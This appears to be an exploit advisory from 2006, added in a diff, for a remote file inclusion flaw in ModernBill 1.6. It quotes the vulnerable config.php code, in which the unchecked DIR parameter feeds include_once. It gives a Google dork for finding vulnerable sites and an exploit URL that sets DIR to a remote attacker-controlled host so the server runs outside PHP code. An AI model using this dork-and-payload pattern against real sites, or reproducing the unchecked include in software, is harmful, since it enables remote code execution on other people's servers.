@@ -1,0 +1,51 @@
+#############################SolpotCrew Community################################
+#
+# modernbill ver 1.6 (DIR) Remote File Inclusion
+#
+# Download file : http://freshmeat.net/projects/modernbill/
+#
+#################################################################################
+#
+#
+# Bug Found By :Solpot a.k.a (k. Hasibuan) (03-08-2006)
+#
+# contact: chris_hasibuan@yahoo.com
+#
+# Website : http://www.solpotcrew.org/adv/solpot-adv-04.txt
+#
+################################################################################
+#
+#
+# Greetz: choi , cow_1seng , Ibnusina , Lappet_tutung , h4ntu , r4dja ,
+# L0sTBoy , Matdhule , setiawan , barbarosa, NpR , Fungky , Blue|spy
+# home_edition2001 , Rendy ,Tje , m3lky , no-profile , bYu
+# and all crew #mardongan @ irc.dal.net
+#
+#
+###############################################################################
+Input passed to the "DIR" is not properly verified
+before being used to include files. This can be exploited to execute
+arbitrary PHP code by including files from local or external resources.
+
+code from include/html/config.php
+
+//include($DIR."include/misc/mod_sessions/session_functions.inc.php");
+#session_set_save_handler("sess_mysql_open","","sess_mysql_read","sess_mysql_write","sess_mysql_destroy","sess_mysql_gc");
+//session_start();
+session_register("set_language");
+session_register("v");
+$new_language = ($set_language) ? $set_language : NULL ;
+$signup_form = TRUE;
+include_once($DIR."include/functions.inc.php");
+## ------------------------------------------------------
+## DO NOT CHANGE STOP
+## ------------------------------------------------------
+
+google dork : allinurl:/modernbill/
+
+exploit: http://somehost/modernbill/include/html/config.php?DIR=http://evilcode
+
+##############################MY LOVE JUST FOR U RIE#########################
+######################################E.O.F##################################
+
+# milw0rm.com [2006-08-07]
